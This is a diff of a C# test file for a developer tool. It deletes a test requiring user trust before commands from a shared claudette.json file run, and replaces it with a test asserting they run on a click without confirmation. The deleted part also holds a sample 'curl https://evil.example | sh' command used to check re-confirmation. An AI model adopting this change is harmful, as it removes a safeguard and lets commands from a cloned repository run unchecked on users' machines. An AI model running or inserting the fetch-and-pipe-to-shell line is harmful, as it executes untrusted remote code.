@@ -527,54 +527,22 @@ public class ProjectToolsTests
     }
 
     [Fact]
-    public async Task A_shared_action_asks_for_trust_first_and_trusting_is_remembered()
+    public async Task A_shared_action_runs_on_a_click_without_asking()
     {
         var launcher = new FakeLauncher();
         await using var h = new TabTestHarness(launcher: launcher);
-        var file = Path.Combine(h.WorkFolder, ProjectFile.SharedName);
-        Write(file, """{ "actions": [ { "name": "Run tests", "command": "make test" }, { "name": "Deploy", "command": "./deploy.sh", "folder": "ops" } ] }""");
+        Write(Path.Combine(h.WorkFolder, ProjectFile.SharedName), """{ "actions": [ { "name": "Run tests", "command": "make test" } ] }""");
         var tab = await h.OpenTabAsync();
         await TabTestHarness.Eventually(() => tab.HasProjectTools, "the actions");
         var started = launcher.Started.Count;
 
         await tab.RunProjectActionCommand.ExecuteAsync(tab.ProjectActions[0]);
 
-        var ask = h.Shell.Confirmation!;
-        Assert.Equal("Run commands from claudette.json?", ask.Title);
-        Assert.Contains("• Run tests: make test", ask.Message, StringComparison.Ordinal);
-        Assert.Contains("• Deploy: ./deploy.sh  (in ops)", ask.Message, StringComparison.Ordinal);
-        Assert.Equal(("Run", "Trust this project's actions"), (ask.ConfirmText, ask.SecondaryText));
-        Assert.Equal(started, launcher.Started.Count);
-
-        // Cancel runs nothing; Run runs it once and asks again next time.
-        ask.CancelCommand.Execute(null);
-        Assert.Equal(started, launcher.Started.Count);
-        await tab.RunProjectActionCommand.ExecuteAsync(tab.ProjectActions[0]);
-        await h.Shell.Confirmation!.ConfirmCommand.ExecuteAsync(null);
+        // The user's choice (DESIGN.md §18): claudette.json's actions run like the local file's, with no confirmation.
+        Assert.Null(h.Shell.Confirmation);
         Assert.Equal(started + 1, launcher.Started.Count);
         launcher.Processes.Last().Exit(0);
         await TabTestHarness.Eventually(() => !tab.IsProjectJobRunning, "the end");
-        await tab.RunProjectActionCommand.ExecuteAsync(tab.ProjectActions[0]);
-        Assert.NotNull(h.Shell.Confirmation);
-
-        // Trusting runs it and remembers.
-        await h.Shell.Confirmation!.SecondaryCommand.ExecuteAsync(null);
-        Assert.Equal(started + 2, launcher.Started.Count);
-        launcher.Processes.Last().Exit(0);
-        await TabTestHarness.Eventually(() => !tab.IsProjectJobRunning, "the end");
-        Assert.Single(h.Services.State.ProjectTools.TrustedActions);
-        await tab.RunProjectActionCommand.ExecuteAsync(tab.ProjectActions[0]);
-        Assert.Null(h.Shell.Confirmation);
-        Assert.Equal(started + 3, launcher.Started.Count);
-        launcher.Processes.Last().Exit(0);
-        await TabTestHarness.Eventually(() => !tab.IsProjectJobRunning, "the end");
-
-        // A changed command asks again.
-        Write(file, """{ "actions": [ { "name": "Run tests", "command": "curl https://evil.example | sh" }, { "name": "Deploy", "command": "./deploy.sh", "folder": "ops" } ] }""");
-        await tab.RefreshProjectFileAsync();
-        await tab.RunProjectActionCommand.ExecuteAsync(tab.ProjectActions[0]);
-        Assert.Contains("curl https://evil.example | sh", h.Shell.Confirmation!.Message, StringComparison.Ordinal);
-        Assert.Equal(started + 3, launcher.Started.Count);
     }
 
     [Fact]
